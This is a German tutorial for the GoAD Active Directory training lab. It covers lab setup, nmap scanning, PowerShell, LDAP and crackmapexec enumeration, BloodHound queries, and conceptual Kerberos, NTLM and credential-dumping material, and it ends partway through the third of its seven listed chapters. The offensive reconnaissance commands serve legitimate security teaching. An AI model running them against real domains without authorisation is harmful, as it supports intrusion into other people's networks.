

# GoAD-Lab: Nützliche Tools zur Lösung und deren Benutzung

## Inhaltsverzeichnis

**1. Einführung in GoAD-Lab und die Toollandschaft**
  - 1.1 Zielsetzung, Ethik und Sicherheitsrahmen
  - 1.2 Toolkategorien im GoAD-Lab
  - 1.3 Vorbereitung des Labors: Infrastruktur, VMs, Netzwerk

**2. Reconnaissance und AD-Enumeration in GoAD-Lab**
  - 2.1 Reconnaissance-Grundlagen: Netzwerkscan, Host-Discovery
  - 2.2 Active Directory-Enumeration mit PowerShell- und Open-Source-Tools
  - 2.3 BloodHound, SharpHound und graphbasierte Modellierung

**3. Credentialen- und Token-basierte Angriffe im GoAD-Lab**
  - 3.1 Kerberos- und NTLM-Grundlagen für Angriffe
  - 3.2 Credential Dumping mit Mimikatz, Rubeus und verwandten Tools
  - 3.3 Pass-the-Hash, Pass-the-Ticket und Token-Manipulation

**4. Zugriffserweiterung, Privilege Escalation und AD-Lateral Movement**
  - 4.1 Privilegien-Eskalationstechniken in AD (Misconfigurations, ACLs)
  - 4.2 AD-ACLs, BloodHound-Analysen und Privilege Mapping
  - 4.3 Golden Ticket, Silver Ticket und Kerberos-Tickets

**5. Persistence, Exfiltration und Operational Security im GoAD-Lab**
  - 5.1 Persistence-Mechanismen im Lab (Scheduled Tasks, Services, WMI)
  - 5.2 Datenexfiltration, Audit-Trails und Sicherheitsüberwachung
  - 5.3 Monitoring, Detection und Forensik im AD-Labor

**6. Toolsammlung, Automatisierung und Workflows im GoAD-Lab**
  - 6.1 Aufbau eines effektiven Tool-Sets: CLI vs GUI
  - 6.2 Automatisierung mit PowerShell und Python-Skripten
  - 6.3 Workflow-Templates: Recon, Credential, Lateral Movement

**7. Ethik, Sicherheit und Best Practices für GoAD-Lab-Übungen**
  - 7.1 Sichere Lab-Administration, Netzsegmentierung und Isolation
  - 7.2 Rechtliche Rahmenbedingungen, Ethik und Compliance
  - 7.3 Best Practices, Übungsdesign und Bewertung


---

## Kapitel: Einführung in GoAD-Lab und die Toollandschaft

### 1.1 Zielsetzung, Ethik und Sicherheitsrahmen

GoAD-Lab dient als formale Lernplattform, die Studierenden, Praktikern und Lehrenden eine praxisnahe Umgebung bietet, um defensive Vorgehensweisen, Incident-Response-Fähigkeiten und forensische Methoden unter kontrollierten Bedingungen zu erproben. Die Zielsetzung liegt darin, komplexe Sicherheitsherausforderungen zu verstehen, robuste Problemlösungsstrategien zu entwickeln und dabei Reproduzierbarkeit, Nachvollziehbarkeit und professionelle Dokumentation sicherzustellen. Ein transparentes Lernzielsystem unterstützt den Lernfortschritt durch klare Aufgabenstellungen, Bewertungsmaßstäbe und kontinuierliches Feedback.

Ethik im GoAD-Lab bedeutet mehr als einfache Rechtskonformität. Sie umfasst den verantwortungsvollen Umgang mit Daten, die Wahrung von Privatsphäre, die Vermeidung von Schaden an Dritten sowie den respektvollen Umgang mit Kolleginnen und Kollegen. Besonders wichtig sind klare Regeln zum Umgang mit sensiblen Informationen, zur Kennzeichnung von Übungen und zur Einhaltung von Datenschutzbestimmungen. Lehrende müssen sicherstellen, dass alle Übungsdaten anonymisiert oder synthetisch sind und dass reale Kundendaten niemals in das Lab gelangen. Studierende sollten sich bewusst sein, dass alle Aktivitäten innerhalb des Labors streng limitsieren und auf reproduzierbare, auditierbare Abläufe ausgerichtet sind.

Sicherheitsrahmen in GoAD-Lab umfasst organisatorische, technische und prozessuale Maßnahmen. Organisatorisch: Definition von Rollen (z. B. Lab-Administrator, Dozent, Lernende) sowie MFA-gestützte Zugriffskontrollen, rollenbasierte Berechtigungen und klare Sperr- bzw. Abbruchkriterien. Technisch: Netzwerksegmentierung, Least-Privilege-Prinzip, regelmäßige Patch- und Konfigurationsmanagement, Monitoring, Evaluierung von Sicherheitslücken sowie Logging für Auditierbarkeit. Prozessual: Risikoanalyse, Notfallmaßnahmen, Sicherungskonzepte, Wiederherstellungs- und Incident-Response-Pläne. Ein wichtiger Bestandteil ist der Dokumentationsstandard: Jedes Experiment wird mit Ziel, Voraussetzungen, Ablauf, erwarteten Ergebnissen, Abbruchkriterien, Ergebnissen und Lessons Learned erfasst.

Die Verbindung von Ethik, Sicherheit und Lernzielkonstruktion schafft eine vertrauenswürdige Lernumgebung. Eine Beispiel-Checkliste für Lernende könnte Folgendes umfassen: Prüfe, ob alle Daten anonymisiert sind; dokumentiere jeden Durchlauf vollständig; sichere Zugangsdaten zeitlich befristet; nutze nur genehmigte Tools; melde Sicherheitsvorfälle unverzüglich an den Lab-Verantwortlichen. Schließlich sollte der Rahmen regelmäßig überprüft werden, um neue Bedrohungen, Regelwerke oder technologische Entwicklungen adäquat abzubilden.

Beispielhafte Struktur eines Sicherheitsrahmens (Kurzform):
- Zieldefinition und Anwendungsbereich
- Rollen und Zugriffskontrollen
- Netzwerksegmentierung und Isolation
- Daten-Treatment: Anonymisierung, Minimierung, Transportverschlüsselung
- Protokolle, Logging und Auditierbarkeit
- Patch- und Änderungsmanagement
- Incident-Response- und Recovery-Verfahren
- Rechts- und Compliance-Anforderungen
- Schulung, Awareness und Verantwortlichkeiten

```
Beispiel-Szenario zur Ethik- und Sicherheitsprüfung im Lab:
- Ziel: Übung zur forensischen Untersuchung eines simulierten Vorfalls.
- Voraussetzungen: Testdaten sind anonymisiert, isoliertes Netzwerk, snapshotbare VM.
- Prozess: Vorfall benennen, Beweissicherung, Timeline rekonstruieren, Ergebnis dokumentieren.
- Abbruchkriterien: Verdacht auf unbeabsichtigte Gefährdung externer Systeme, Zugriff auf reale Daten, Lizenzprobleme.
```

### 1.2 Toolkategorien im GoAD-Lab

GoAD-Lab bedient sich einer strukturieren Toollandschaft, die in klaren Kategorien organisiert ist. Die Kategorisierung unterstützt Lernpfade, Wiederholbarkeit und den sicheren Austausch von Best Practices. Die wichtigsten Kategorien sind:

- Infrastruktur- und Virtualisierungstools: Hypervisoren, virtuelle Maschinen und Containermanager, die eine isolierte Laborumgebung bereitstellen. Zweck ist die schnelle Bereitstellung wiederholbarer Basiskonfigurationen, das parallele Durchführen mehrerer Übungen und das einfache Vendor-unabhängige Arbeiten.
- Netzwerk- und Kommunikationswerkzeuge: Tools für Netzwerksimulation, Traffic-Generierung, Abhör- und Analysesoftware sowie Mesh- und Segmentierungskonzepte. Ziel ist das Verständnis von Protokollen, Latenzen, Fehlerbehandlung und Validierung von Netzwerktopologien.
- Forensik, Incident Response und Monitoring: Werkzeuge zur Beweissicherung, Dateisystemanalyse, Speicherauswertung, Protokolldatenanalyse sowie zur Erkennung und Reaktion auf Sicherheitsvorfälle in Echtzeit.
- Schwachstellenanalyse, Auditierung und Bedrohungsmodellerstellung: Scanning- und Assessment-Tools, die Sicherheitsschwachstellen abstrahieren und die Risikoabwägung unterstützen, ohne dabei Produktionssysteme zu beeinträchtigen.
- Datenmanagement, Reproduzierbarkeit und Dokumentation: Automatisierungstools, Protokollierung, Versionskontrolle und Reproduzierbarkeitsmechanismen (Snapshots, Infrastructure-as-Code, Lernpfade).
- Lernpfade, Kollaboration und Verwaltungswerkzeuge: Plattformen zur Aufgabenverteilung, gemeinsamen Dokumentation, Peer-Review-Prozesse sowie Zugriffskontrollen und Auditierbarkeit.

Beispiele für typische Tools innerhalb dieser Kategorien:
- Infrastruktur/VM-Management: VirtualBox, VMware Workstation, KVM, Hyper-V
- Orchestrierung/Provisionierung: Vagrant, Packer, Terraform (für Cloud- oder Hybrid-Labs)
- Netzwerk-Analyse/Traffic-Tools: Wireshark, Tshark, tcpdump, iperf
- Forensik/IR: Autopsy, SleuthKit, Volatility, FTK Imager
- Schwachstellen-Scans: Nmap, OpenVAS
- Logging/Monitoring: Elastic Stack (ELK), Graylog, Splunk (Lernumgebung)
- Malware-Analyse/Isolation: Cuckoo Sandbox, REMnux-Distribution (als Referenz)

Hinweis zu Einsatzszenarien: In GoAD-Lab soll der Fokus auf sicherem, reproduzierbarem Lernen liegen. Nicht alle Tools müssen gleichzeitig vorhanden sein; stattdessen wird eine modulare Architektur bevorzugt, die den Austausch von Tools ermöglicht. Lizenzmodelle, Open-Source-Alternativen und Schulungs-Accounts sollten klar definiert sein, damit Lernende innerhalb des rechtlich zulässigen Rahmens arbeiten.

```
Beispiel-Toolkatalog (Übersicht)
Kategorie                         | Beispiel-Tools                         | Zweck
---------------------------------------------------------------------------------------------
Infrastruktur/VM-Management       | VirtualBox, VMware Workstation, KVM     | Bereitstellung isolierter Lernumgebungen
Netzwerk/Traffic                   | Wireshark, tshark, tcpdump, iperf        | Analyse, Messung, Protokollverstehen
Forensik/IR                        | Autopsy, SleuthKit, Volatility             | Beweissicherung, Speicher- und Dateisystemanalyse
Schwachstellen-/Auditierung        | Nmap, OpenVAS, Nessus (Lizenzen beachten) | Sicherheitsscans, Risikobewertung
Logging/Monitoring                 | Elastic Stack, Graylog, Splunk (Lernumgebung) | Überwachung, Protokollanalyse, Ereignisdetection
Automatisierung/Orchestrierung     | Vagrant, Packer, Terraform                  | Reproduzierbare Infrastruktur, Image-Builds
Lern- und Kollaborations-Tools     | Git, Docu-Templates, Jupyter (Docs)        | Versionskontrolle, Dokumentation, Zusammenarbeit
```

Stichpunkte zur Nutzung:
- Verwende ausschließlich isolierte Lernnetze; niemals Produktionsdaten verwenden.
- Dokumentiere alle Schritte sorgfältig, damit andere Lernende die Übung reproduzieren können.
- Beachte Lizenz- und Nutzungsbedingungen der eingesetzten Tools; nutze Open-Source-Alternativen, wo möglich.
- Plane regelmäßige Updates und Patch-Management als Übungsinhalt ein, um Sicherheitsprozesse realitätsnah zu trainieren.

### 1.3 Vorbereitung des Labors: Infrastruktur, VMs, Netzwerk

Die Vorbereitung des Labors umfasst die Auswahl der Infrastruktur, die Erstellung wiederverwendbarer VM-Images, die Netzwerkarchitektur und die Automatisierung der Provisionierung. Eine solide Basis sorgt für Reproduzierbarkeit und reduziert Störquellen während der Übungen. Zunächst gilt es, die Anforderungen zu baselineisieren: Hardware, Hypervisor-Unterstützung, Speicherkapazität, Netzwerkkonnektivität sowie Sicherheits- und Compliance-Erwartungen. Für die meisten praxisnahen Übungen empfiehlt sich ein Host-System mit mindestens 16–32 GB RAM, 4–8 CPU-Kerne und ausreichend Festplattenspeicher (mindestens 200–500 GB, je nach Anzahl der VMs und Softwarepakete). Eine klare Trennung von Lern- und Arbeitsdaten reduziert das Risiko unbeabsichtigter Exposition.

Infrastruktur-Optionen reichen von lokalen Virtualisierungslösungen (VirtualBox, VMware, Hyper-V, KVM) bis zu Cloud- oder Hybrid-Setups unter Verwendung von Infrastruktur-as-Code. Für Lernzwecke bietet sich eine modulare Architektur, in der Basis-Images als Vorlagen dienen und Übungsumgebungen durch Snapshots gesichert werden. Die Netzwerkarchitektur sollte isolierte Segmente vorsehen, damit Übungen keine Verbindung zu externen Netzwerken herstellen. Typische Segmentierungen sind:
- Management-Netzwerk für Admin-Interaktion und Logging
- Übungsnetzwerk mit eingeschränkter Konnektivität
- Forensik-/Schnuppernetzwerk mit spezieller Konfiguration für Analysewerkzeuge

Um Wiederholbarkeit sicherzustellen, empfiehlt sich der Einsatz von Vagrant bzw. Terraform in Kombination mit einem Hypervisor. So können Basiskonfigurationen versioniert und reproduziert werden. Automatisierte Builds reduzieren manuelle Fehler und erleichtern das Rollback durch Snapshots oder Images. Ein standardisiertes Baseline-Image, das regelmäßig aktualisiert wird, ist vorteilhaft; zusätzliche Dateien wie Ansible-Playbooks oder Packer-Vorlagen können die Bereitstellung beschleunigen.

Beispielhafter Bereitstellungsablauf:
- Step 1: Definition der Zielarchitektur (VMs, Netze, Speicherbedarf)
- Step 2: Auswahl des Hypervisors und der Autorisierungsmethoden
- Step 3: Erstellung eines Basissystems (Betriebssystem, Sicherheitsupdates, Basiskonfiguration)
- Step 4: Netzwerk-Topologie innerhalb des Hostsystems konfigurieren (Host-Only, NAT, interne Netze)
- Step 5: Erstellung von Snapshots für jede Übungsumgebung
- Step 6: Automatisierung von Provisionierung und Abbau der Lab-Umgebungen

Konkrete Umsetzungsbeispiele (Vereinfachte Befehle zur Veranschaulichung):
```
# Prüfen der Virtualisierungshardware (Beispiel für Linux-Hosts)
lscpu
grep -E 'flags:.*vmx|svm' /proc/cpuinfo

# Erstellung einer neuen VM (VirtualBox CLI, ohne Sprachbezeichnung)
VBoxManage createvm --name "GoAD-Base" --register
VBoxManage modifyvm "GoAD-Base" --memory 4096 --cpus 2 --nic1 nat
VBoxManage storagectl "GoAD-Base" --name "SATA Controller" --add sata --controller IntelAHCI
VBoxManage storageattach "GoAD-Base" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium base.img
```

Zusätzliches Layout und Planungshinweise:
- Definiere eine klare Namenskonvention für VMs, Netze und Snapshots, damit Duplizierung vermieden wird.
- Plane regelmäßige Backups der Basiskomponenten und der Lerndaten.
- Dokumentiere alle Abhängigkeiten zwischen Tools, Images und Netzzomen, um Fehlerquellen zu minimieren.
- Verwende Versionskontrolle (Git) für Konfigurationsdateien, Skripte und Lernmaterialien.

Diese Kapitel geben eine fundierte Grundlage für die ethische, sichere und reproduzierbare Nutzung von GoAD-Lab. Die konkrete Implementierung bleibt flexibel anpassbar, solange die Grundprinzipien von Sicherheit, Nachvollziehbarkeit und Lernförderung eingehalten werden.
## KAPITEL: Reconnaissance und AD-Enumeration in GoAD-Lab

### 2.1 Reconnaissance-Grundlagen: Netzwerkscan, Host-Discovery

Reconnaissance bildet die erste Phase jeder sicherheitsrelevanten Analyse in GoAD-Lab. Ziel ist es, ein klares Verständnis der Zielumgebung zu gewinnen, bevor weitere Schritte geplant werden. In diesem Kontext wird zwischen zwei Grundtypen unterschieden: Netzwerkscan (Discovery von offenen Ports, Diensten und Sammlungen von Hosts) sowie Host-Discovery (Bestimmung, welche Hosts in einem Subnetz tatsächlich erreichbar sind). Beide Aspekte liefern wichtige Eingangsdaten für nachfolgende Enumerations- und Angriffspfad-Analysen – selbstverständlich nur in einer genehmigten Lab- oder Übungsumgebung.

Zentrale Konzepte
- Passive vs. aktive Recon: Passive Methoden sammeln Informationen ohne direkte Interaktion mit Zielsystemen, aktive Methoden verursachen Verkehr und können von IDS/IPS erkannt werden. In GoAD-Lab wird ein ausgewogener Mix aus beidem empfohlen, um reale Auswertungen zu simulieren, ohne unnötige Spuren zu hinterlassen.
- Topologie und Segmentierung: Moderne AD-Umgebungen sind oft segmentiert. Recon hilft, Zonen, Subnetze, Routerpfade und Firewall-Einschränkungen zu kartieren. Ein korrektes Verständnis reduziert Fehlschlüsse bei späteren Analysen.
- Belegbare Ergebnisse: In Lehrbüchern und Labs ist es wichtig, Ergebnisse zu dokumentieren, inklusive Zeitstempel, Quell- und Zieladressen, abgehörter Ports sowie eventueller Gegenmaßnahmen. Das erleichtert Reproduzierbarkeit und Lernkontrollen.

Typische Methoden und Werkzeuge
- Netzwerkscanner: Sie dienen dem Nachweis, welche Hosts erreichbar sind und welche Ports offen sind. Typische Beispiele sind Nmap und Masscan. In einer sicheren Lab-Umgebung eignen sich gezielte Scans, um Störquellen zu minimieren.
- Host-Discovery: Ping-Sweeps, ICMP-Requests, ARP-Scan oder einfache TCP-Verbindungsversuche helfen, aktive Systeme zu identifizieren, ohne umfangreiche Port-Scans durchzuführen.
- Hosting- und Dienst-Informationen: DNS- und NetBIOS-/LSP-bezogene Informationen liefern Hinweise auf Domänenstrukturen, Computernamen und mögliche Services.

Beispielhafte Befehle (in der GoAD-Lab-Umgebung einzusetzen)
```
# Schnelles Ping-Sweep-Subnetz-Teilbereich (Ergebnisliste der erreichbaren Hosts)
nmap -sn 192.168.100.0/24

# Tiefere Analyse einzelner Hosts auf häufig genutzte Windows-Dienste (RDP, SMB, WinRM)
nmap -sS -p 445,3389 192.168.100.10-20

# Einfache Host-Discovery mit PowerShell (Windows-Umgebung)
Test-Connection -ComputerName 192.168.100.5 -Count 2 -Quiet
```

Auswertung und Dokumentation
- Erstellen Sie eine kompakte Hostliste mit Spalten wie Hostname, IP-Adresse, erkannte Ports, ggf. Betriebssystemhinweisen und Auffälligkeiten.
- Notieren Sie Sicherheitsrelevante Beobachtungen (z. B. offen zugängliche SMB-Dienste, erreichbare Domain-Controller, ungewöhnliche Dienste).
- Reflektieren Sie mögliche Auswirkungen auf Sicherheit und Compliance, insbesondere in Übungsumgebungen.

Hinweise
- Arbeiten Sie ausschließlich in der vorgesehenen GoAD-Lab-Umgebung und mit entsprechender Genehmigung. Respektieren Sie Neutralität, Privatsphäre und gesetzliche Vorgaben.
- Interpretieren Sie Ergebnisse kritisch: Ein offener Port bedeutet nicht automatisch eine Schwachstelle; es ist ein Indikator, der weitere Untersuchung verdient.

### 2.2 Active Directory-Enumeration mit PowerShell- und Open-Source-Tools

Active Directory (AD) zentralisiert Ressourcen, Identitäten und Richtlinien. In GoAD-Lab steht die AD-Enumeration im Vordergrund, um ein Verständnis dafür zu entwickeln, wie Berechtigungen, Gruppenstrukturen und Domänen-Topologien abgebildet werden. Zwei Hauptpfade kommen zum Einsatz: native PowerShell-Module (z. B. ActiveDirectory) für Windows-Umgebungen sowie Open-Source-Werkzeuge, die plattformübergreifend arbeiten (z. B. LDAP-Clients, Python-Module, BloodHound/SharpHound-Quellen). Ziel ist es, ein konsistentes Abbild der AD-Struktur zu erzeugen – ohne dabei reale Systeme zu gefährden.

PowerShell-basierte AD-Enumeration
- Voraussetzungen: PowerShell mit dem ActiveDirectory-Modul (typisch auf Windows-Servern bzw. Windows-Clients mit RSAT installiert).
- Typische Aufgaben: Domain- und Forest-Information, Domain-Controller-Details, Benutzer- und Gruppeneigenschaften, Gruppenzugehörigkeiten, ACL-Berechtigungen.
- Vorgehen (Beispiele):
```
Import-Module ActiveDirectory

# Grundlegende Domänen- und Forest-Informationen
Get-ADDomain
Get-ADForest

# Domain-Controller-Übersicht
Get-ADDomainController -Filter * -Properties *

# Benutzer und Gruppen
Get-ADUser -Filter * -Properties SamAccountName, Enabled, LastLogonDate
Get-ADGroup -Filter * -Properties Members
Get-ADGroupMember -Identity "Domain Admins"

# Detaillierte Eigenschaften einzelner Objekte
Get-ADObject -Filter "(objectClass=user)" -Property * | Select-Object Name,SamAccountName,ObjectGUID
```
- Hinweise: Import-Module ist zwingend; der Zugriff erfolgt durch authentifizierte Identitäten mit passenden Berechtigungen. Ergebnisse sollten in nachvollziehbare Protokolle überführt werden.

Open-Source- und plattformunabhängige Ansätze
- LDAP-Clients: LDAP-Suche gegen Directory-Services, z. B. ldapsearch; ergänzend Python-Tools wie ldap3.
```
ldapsearch -x -H ldap://dc1.example.local -b "dc=example,dc=local" "(objectClass=person)"
```
- Python-Programmierung mit ldap3 ermöglicht flexible Abfragen, Filterung und Paginierung.
```
from ldap3 import Server, Connection, ALL
server = Server('dc1.example.local', get_info=ALL)
conn = Connection(server, 'user@example.local', 'WayTooSecret', auto_bind=True)
conn.search('dc=example,dc=local', '(objectClass=person)', attributes=['cn','memberOf','mail'])
```
- Open-Source-Tools: CrackMapExec (CME) und ähnliche Lösungen unterstützen gezielte Recon-Strategien über SMB/LDAP-Infrastruktur.
```
crackmapexec smb dc1.example.local -u 'user' -p 'Password123' --shares
```

Durchführung in der GoAD-Lab-Umgebung
- Dokumentieren Sie, welche Objektklassen vorhanden sind, welche Benutzertypen existieren, und welche Gruppenstrukturen dominieren.
- Nutzen Sie die so gewonnenen Informationen, um potenzielle Angriffswege in einer kontrollierten Übungsumgebung zu simulieren, z. B. Coverage von Administratorgruppen, Privilegien-Überprüfungen, Vorhandensein veralteter Konten oder widersprüchlicher ACLs.
- Achten Sie auf sichere Handhabung von Anmeldeinformationen und vermeiden Sie das unbeaufsichtigte Offizieren von Keys oder Sessions.

### 2.3 BloodHound, SharpHound und graphbasierte Modellierung

BloodHound bietet eine graphbasierte Sicht auf AD-Umgebungen. Kernidee ist, Beziehungen zwischen Benutzern, Gruppen, Computern und Berechtigungen in einem Graphen abzubilden, um potenzielle Angriffswege (Attack Paths) besser zu verstehen und zu priorisieren. SharpHound dient als Collector, der AD-Informationen in Form von JSON-Dateien sammelt, die anschließend in BloodHound importiert werden. Die Graphdatenbank Neo4j speichert diese Informationen und ermöglicht komplexe Abfragen, Visualisierung sowie Mustererkennung.

Was wird gesammelt und wie funktioniert der Aufbau?
- Zentrale Knoten (Nodes): User, Computer, Group, OU, Domain, Credential-Objects, Sessions.
- Beziehungen (Edges): MemberOf, HasSession, AdminTo, Trusts, LAPS-Policies und mehr. Diese Kanten charakterisieren Privilegienpfade, gegenseitige Abhängigkeiten und administrative Verbindungen.
- Datensammlungsmethoden: SharpHound nutzt LDAP-, SMB-, Kerberos- und andere Mechanismen, um Berechtigungen, ACLs, Gruppenmitgliedschaften, Session-Informationen und Vertrauensverhältnisse zu erfassen. Die Ausgabe erfolgt typischerweise als JSON, die in BloodHound eingespielt wird.

Beispielhafte Arbeitsabläufe
- Sammlung vorbereiten: Stellen Sie sicher, dass SharpHound auf Zielmaschinen mit passendem Zugriff ausgeführt werden kann. Die Ausgabe wird in einem Verzeichnis abgelegt, das BloodHound später importiert.
- Import in BloodHound: Die JSON-Dateien werden in die Neo4j-basierte BloodHound-Datenbank ingestiert. Danach stehen Graphen zur Analyse bereit.
- Graphische Analyse: In BloodHound lassen sich Standardknoten wie Domain Admins, AdminSDHolder-Rollen oder verteilte Berechtigungsstrukturen visuell erkennen. Die Startpunkte reichen von privilegierten Gruppen bis zu seltenen Sessions, die zu potenziellen Kompromittierungen führen können.

Wesentliche Abfragen (Cypher-Beispiele)
```
# Pfad von Domain Admins zu einem Computer ermitteln
MATCH p=(u:User)-[:MemberOf]->(g:Group {name:'Domain Admins'})<-[:HasSession|AdminTo*]-(c:Computer)
RETURN p LIMIT 25

# Kürzeste Pfade zu sensiblen Zielen
MATCH p = shortestPath((start:User {name:'DOMAIN\\admin'})-[:HasSession|MemberOf|AdminTo*]-(end:Computer))
RETURN p
```
- Erweiterte Analysen helfen, privilegierte Pfade, übersehene Gruppenmitgliedschaften oder exotische Vertrauensbeziehungen zu identifizieren. Die Graph-Modellierung erlaubt es, Sicherheitsmaßnahmen gezielt zu priorisieren, etwa durch Entfernen unnötiger Gruppenmitgliedschaften, strengere ACLs oder gezielte GPO-Einstellungen.

Best Practices und Lernziele
- Strukturierte Datenqualität: Achten Sie darauf, dass SharpHound-Versionen konsistent mit BloodHound sind und dass Import-Quellen sauber aufbereitet werden, um falsche oder veraltete Verbindungen zu vermeiden.
- Datenschutz in Übungssituationen: Achten Sie darauf, keine echten personenbezogenen Daten zu verwenden; verwenden Sie Muster-Accounts und isolierte Test-Objekte.
- Legalität und Ethik: Arbeiten Sie stets in genehmigten Umgebungen, mit klarem Ziel der Sicherheitsverbesserung und ohne unbeabsichtigte Störung produktiver Systeme.

Schematische Tabellen (Beispielhafte Felder)
```
| Node-Typ     | Relevante Felder                     | Zweck der Abbildung                            |
|--------------|--------------------------------------|-------------------------------------------------|
| User         | samAccountName, DistinguishedName, Enabled, LastLogonDate | Identität und Nutzungsstatus                     |
| Group        | name, Members, AdminCount             | Rollen- und Berechtigungsstruktur                   |
| Computer     | DNSHostname, OperatingSystem, LastLogonTimestamp | Zielsysteme, auf die möglicherweise privilegierte Sitzungen verweilen |
| Domain       | name, FunctionalLevel                 | Domänenkontext und Kompatibilität                   |
| Edge         | MemberOf, HasSession, AdminTo, Trusts  | Beziehungen und mögliche Angriffswege              |
```

Hinweise zur praktischen Nutzung
- BloodHound und SharpHound sollten in einer kontrollierten Umgebung eingesetzt werden, um sensible Informationen zu analysieren und zu verstehen, wie Angreifer theoretisch Pfade durch Privilegien nutzen könnten.
- Verwenden Sie Cypher-Abfragen verantwortungsvoll, um Sicherheitsempfehlungen abzuleiten (z. B. Minimierung von Mitgliedschaften in privilegierten Gruppen, Prüfung von ACLs, Stärkung von Delegationseinstellungen).
- In der GoAD-Lab-Umgebung sollten Ergebnisse protokolliert, versioniert und regelmäßig validiert werden, damit Lernende nachvollziehbare Pfade für Diskussionen und Reflexion erhalten.

Hinweis
- Die hier dargestellten Inhalte dienen ausschließlich der sicheren, genehmigten Lehre in der GoAD-Lab-Umgebung. Vermeiden Sie den Einsatz solcher Techniken auf unautorisierten Systemen.
## KAPITEL: Credentialen- und Token-basierte Angriffe im GoAD-Lab

### 3.1 Kerberos- und NTLM-Grundlagen für Angriffe

Kerberos und NTLM sind zentrale Authentifizierungsprotokolle in vielen Windows-basierten Domänenumgebungen. In GoAD-Lab-Beispielen dienen sie dazu, die Funktionsweisen, Schwachstellen und Verteidigungsansätze zu verstehen – jedoch ohne reale Angriffs- oder Exekutionsschritte außerhalb eines autorisierten Labors. Dieses Unterkapitel vermittelt daher grundlegendes Verständnis, typische Angriffsflächen und mögliche Gegenmaßnahmen.

Kerberos ist ein Ticket-basiertes Protokoll, das auf vertrauenswürdigen Tickets zwischen Clients, Key Distribution Center (KDC) und Diensten basiert. Zentrale Konzepte sind:
- AS-REQ/AS-REP: Der Client erhält beim ersten Login ein Ticket Granting Ticket (TGT) vom KDC.
- TGS-REQ/TGS-REP: Aus dem TGT wird ein Service-Ticket (TGS-Ticket) für den gewünschten Dienst ausgestellt.
- Service-Tickets (TGT abgeleitete Tickets) ermöglichen Authentifizierung ohne wiederholte Passworteingabe.
- Sitzungsschlüssel, Verschlüsselung der Ticketdaten, sowie Auditinformationen (z. B. User, SPN, Service) spielen eine Rolle.

NTLM ist ein älteres Challenge-Response-Verfahren. Es verwendet Hash-Werte des Kennworts statt des Klartextkennworts. In NTLM-Umgebungen können Angreifer mit Zugang zu Hashes bzw. entsprechenden Verifizierungsvorgängen späteren Ressourcen gegenüber auftreten. Kerberos bietet in vielen modernen Umgebungen stärkere Sicherheit und bessere Verwundbarkeitseinschränkung, während NTLM in gemischten Environments oft noch vorhanden ist.

Für Angriffe in der Theorie bedeutet das:
- Kerberos-Angriffe konzentrieren sich auf das Kopieren, Missbrauchen oder Erstellen von Tickets (SSO-fähig, breit nutzbar). Das macht das Verwalten von TGTs, TGS-Tickets und SPNs kritisch.
- NTLM-basierte Angriffe nutzen Hashes oder Verhandlungsmethoden, was in vielen Netzen zu dreifachen Angriffsflächen führt (Hash-Extraktion, Weitergabe, Re-Use).

Defensive Perspektive im GoAD-Lab:
- Aktiviere Kerberos- und NTLM-Auditing, monitoriere ungewöhnliche Ticket-Erstellungen (4768, 4769) und Anmeldeereignisse (4624, 4625).
- Reduziere NTLM-Verwendung durch Policy, erhöhe Kerberos-Sicherheit (Protected Users, delegation restrictions).
- Prüfe SPN-Konfigurationen, vermeide übermäßige Berechtigungen, verwende minimale Privilegien.
- Segmentiere das Netzwerk, nutze isolierte Labore und zeitlich begrenzte Testkonten.

Beispielhafte Übungsziele (sicher):
- Untersuche, wie sich TGT-Lebenszeit und Ticket-Verweildauer auf die Angriffsoberfläche auswirken.
- Simuliere in der Laborumgebung Ereignisse, die auf untypische Ticket-Verwendung hinweisen, und entwickle Detektionsregeln.

Beispielhafte Begriffstafel (conceptual, no executable steps):
```
Kerberos              NTLM
AS-REQ/AS-REP         NTLM-Challenge/Response
TGT (Ticket Granting)  Hash-basiertes Authentifizierungsmaterial
TGS-Ticket             NTLM-Hash- oder NTLM-Verifikation
SPN                   - (Service Principal Name) - Kennzeichnet Dienste
Sicherheitsempfehlung   Kerberos-first-Strategie, NTLM-Deaktivierung, Delegationseinschränkungen
```

Zusammenfassend bietet Kerberos mit seinen Tickets eine robuste Architektur, während NTLM in Legacy-Szenarien und bestimmten Konfigurationen verbleibt. In GoAD-Lab wird der Fokus darauf gelegt, wie Organisationen solche Systeme sicher gestalten, wie man verdächtige Ticket-Muster erkennt, und wie man Angriffe auf tokenbasierte Authentifizierungen durch präventive Maßnahmen reduziert.

```
Beispiel-Dokumentation (Konzeptionell, nicht ausführbar)
Selbstlernziel: Verstehen des Authentifizierungsflusses und der Auditpunkte in Kerberos vs. NTLM
```

### 3.2 Credential Dumping mit Mimikatz, Rubeus und verwandten Tools

Credential Dumping bezieht sich auf das Abrufen von in-Place- oder Memory-basierten Anmeldeinformationen aus einem System. In echten Angriffsszenarien würden Tools wie Mimikatz oder Rubeus genutzt, um LSASS-Inhalte, Kerberos-Tickets oder Hashes zu extrahieren. Im GoAD-Lab konzentrieren wir uns auf das vermeidbare Risiko, Erkennungsansätze und sichere, lizenzierte Einsatzformen in einer isolierten Umgebung.

Wesentliche Konzepte:
- LSASS-Dumps: In Windows-Systemen können Anmeldeinformationen im Arbeitsspeicher verborgen gehalten werden. Zugriff ohne entsprechende Schutzmechanismen eröffnet potenziell extensive Privilegienpfade.
- Kerberos-Tickets: Aus dem Speicher extrahierte Tickets ermöglichen die Fortführung von Authentifizierungen, auch ohne Klartextkennwort.
- Hashes und Tokens: NTLM-Hashes, Kerberos-Tickets oder Tokens können in einem kontrollierten Umfeld repurppuiert werden, um weitere Ressourcen zu erreichen.

Angreiferische Nutzungsschemata (theoretisch beschrieben) würden typischerweise darauf abzielen, Speicherzugriff zu erlangen, um Passworte, Hashes oder Tokens zu extrahieren. Aus defensiver Sicht gilt es, solche Aktionen frühzeitig zu erkennen und zu verhindern:
- Detektion auf ungewöhnliche LSASS-bezogene Aktivitäten, Memory-Reads, Prozess-Exploitation und unsigned Treiber.
- Verhaltensbasierte Erkennung, z. B. plötzliche Speicherzugriffe auf Sicherheitsprozesse, ungewöhnliche Zugriffsmuster auf Kerberos-Tickets.
- Schutzmaßnahmen wie Credential Guard, Minimierung lokaler Administratorrechte, regelmäßige Patch- und Konfigurationshärtung, sowie Monitoring mit Sysmon-Logs und EDR-Lösungen.

Sichere Laborpraxis in GoAD-Lab:
- Vermeide reale Dump-Operationen außerhalb des Labors. Nutze statische oder simulierte Datensätze, um Lernziele zu erreichen.
- Dokumentiere Ereignisse und Abweichungen, statt Schritte zur Durchführung von Dump-Aktionen zu demonstrieren.
